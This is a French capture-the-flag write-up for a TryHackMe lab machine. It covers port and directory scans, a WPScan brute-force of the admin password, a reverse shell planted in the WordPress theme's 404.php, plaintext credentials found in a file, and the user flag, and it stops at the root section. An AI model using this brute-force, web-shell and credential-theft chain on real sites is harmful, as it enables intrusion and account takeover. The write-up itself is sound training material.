# Internal

## User.txt Flag

### Nmap Scan

Nous obtenons 2 ports ouverts
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster Scan

Grâce à Gobuster nous pouvons voir une dir qui est /blog
```
root@yazuko:/data/The_Blob_Blog/files$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 14:28:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blog (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/09/03 14:29:00 Finished
===============================================================
```

### WordPress Scan

WPScan nous trouve seulement l'utilisateur admin d'après lui
```
root@yazuko:/data/The_Blob_Blog/files$ wpscan --url http://internal.thm/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.137.187]
[+] Started: Thu Sep  3 14:36:16 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Sep  3 14:36:20 2020
[+] Requests Done: 24
[+] Cached Requests: 34
[+] Data Sent: 5.936 KB
[+] Data Received: 181.104 KB
[+] Memory used: 172.43 MB
[+] Elapsed time: 00:00:03
```

Essayons de forcer brutalement le mot de passe, en utilisant la fonction bruteforce de WPScan :
```
root@yazuko:/data/The_Blob_Blog/files$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt 

[REDACTED]

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[REDACTED]
```

Bingoo !! Nous avons trouvé le mot de passe admin qui est `my2boys`
Maintenant nous allons nous connecter en tant qu'administrateur sur la page de connexion de [wordpress](http://internal.thm/blog/wp-admin/)
Nous avons maintenant la possibilité de modifier le code source, ce qui nous permettra de faire un reverse shell
Donc dans l'interface web, il suffit d'aller dans “Appearance > Theme Editor > 404.php”  et de remplacer ce code php par notre reverse shell

### Reverse Shell

```
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.137.187] 51322
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:46:33 up 23 min,  0 users,  load average: 0.02, 0.20, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@internal:/$ whoami
whoami
www-data
```

Dans le dossier /opt nous pouvons voir un fichier nommé wp-save.txt, regardons ce qu'il y a à l'intérieur:

```
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
Bien joué, nous obtenons le mdp de aubreanna, connectons nous

```
www-data@internal:/opt$ su aubreanna
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/opt$ whoami
whoami
aubreanna
```

### User Flag
Le flag utilisateur est caché dans les fichier de aubreanna

```
aubreanna@internal:/opt$ cd /home/aubreanna
cd /home/aubreanna
aubreanna@internal:~$ ls -la
ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3 03:57 .
drwxr-xr-x 3 root      root      4096 Aug  3 01:40 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3 20:01 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3 01:41 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3 19:36 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:53 .local
-rwx------ 1 root      root       223 Aug  3 01:56 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3 02:38 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3 01:41 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3 03:57 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:41 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3 03:56 user.txt
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}
```

**User Flag: `THM{int3rna1_fl4g_1}`**

## Root.txt Flag
